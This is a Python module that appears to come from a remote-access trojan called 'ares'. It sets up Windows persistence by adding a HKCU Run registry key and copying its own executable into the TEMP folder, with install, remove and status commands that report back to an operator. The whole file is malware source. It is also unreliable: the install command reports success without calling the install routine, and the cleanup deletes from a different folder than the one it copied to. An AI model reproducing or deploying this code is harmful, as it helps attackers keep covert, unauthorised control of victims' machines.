import os
import sys
import subprocess
import shutil
import requests
import os

import utils


SERVICE_NAME= "ares"

if getattr(sys, 'frozen', False):
    EXECUTABLE_PATH = sys.executable
elif __file__:
    EXECUTABLE_PATH = __file__
else:
    EXECUTABLE_PATH = ''
EXECUTABLE_NAME = os.path.basename(EXECUTABLE_PATH)


def install():
    if not is_installed():
        stdin, stdout, stderr = os.popen3("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME, os.environ["TEMP"] + "\\" + EXECUTABLE_NAME))
        shutil.copyfile(EXECUTABLE_PATH, os.environ["TEMP"] + "/" + EXECUTABLE_NAME)


def clean():
    subprocess.Popen("reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s" % SERVICE_NAME,
                         shell=True)
    subprocess.Popen(
        "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME, "\"cmd.exe /c del %USERPROFILE%\\" + EXECUTABLE_NAME + "\""),
                          shell=True)


def is_installed():
    output = os.popen(
        "reg query HKCU\Software\Microsoft\Windows\Currentversion\Run /f %s" % SERVICE_NAME)
    if SERVICE_NAME in output.read():
        return True
    else:
        return False


def run(action):
    if action == "install":
        utils.send_output("Persistence installed")
    elif action == "remove":
        clean()
        utils.send_output("Persistence removed")
    elif action == "status":
        if is_installed():
            utils.send_output("Persistence is ON")
        else:
            utils.send_output("Persistence is OFF")


def help():
    help_text = """
Usage: persistence install|remove|status
Manages persistence.

"""
    return help_text
